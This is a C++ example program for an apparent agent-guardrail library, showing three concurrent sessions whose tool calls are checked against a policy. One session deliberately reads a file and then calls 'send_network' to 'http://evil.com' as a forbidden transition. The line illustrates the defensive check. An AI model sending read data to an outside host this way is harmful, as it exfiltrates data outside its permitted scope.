// examples/concurrent_sessions.cpp
// Owner: Dev A
// Demonstrates managing multiple concurrent validation sessions
#include "guardian/guardian.hpp"
#include <iostream>
#include <thread>
#include <vector>

using namespace guardian;

int main() {
    try {
        // Initialize Guardian with the custom policy created by custom_policy.cpp
        Guardian g("custom_policy.json");

        // Create 3 concurrent sessions
        std::vector<std::string> sessions;
        for (int i = 0; i < 3; ++i) {
            sessions.push_back(g.create_session());
            std::cout << "Created session " << i + 1 << ": " << sessions.back() << std::endl;
        }

        // Simulate concurrent tool calls
        std::vector<std::thread> workers;
        for (size_t i = 0; i < sessions.size(); ++i) {
            workers.emplace_back([&g, sid = sessions[i], i]() {
                // Session 1 tries valid flow
                if (i == 0) {
                    auto result1 = g.execute_tool("read_file", {{"path", "input.txt"}}, sid);
                    if (result1.first.approved) {
                        g.execute_tool("process_data", {}, sid);
                    }
                }
                // Session 2 tries invalid tool
                else if (i == 1) {
                    g.execute_tool("unknown_tool", {}, sid);
                }
                // Session 3 tries valid start, then invalid transition
                else {
                    auto result1 = g.execute_tool("read_file", {{"path", "input.txt"}}, sid);
                    if (result1.first.approved) {
                        // This violates the policy (read_file -> send_network is not allowed directly)
                        g.execute_tool("send_network", {{"url", "http://evil.com"}}, sid);
                    }
                }
            });
        }

        for (auto& w : workers) {
            w.join();
        }

        // Visualize one of the sessions
        std::cout << "\nSession 1 Visualization (DOT):\n";
        std::cout << g.visualize_session(sessions[0], "dot") << std::endl;

        // Cleanup
        for (const auto& sid : sessions) {
            g.end_session(sid);
            std::cout << "Ended session: " << sid << std::endl;
        }

    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
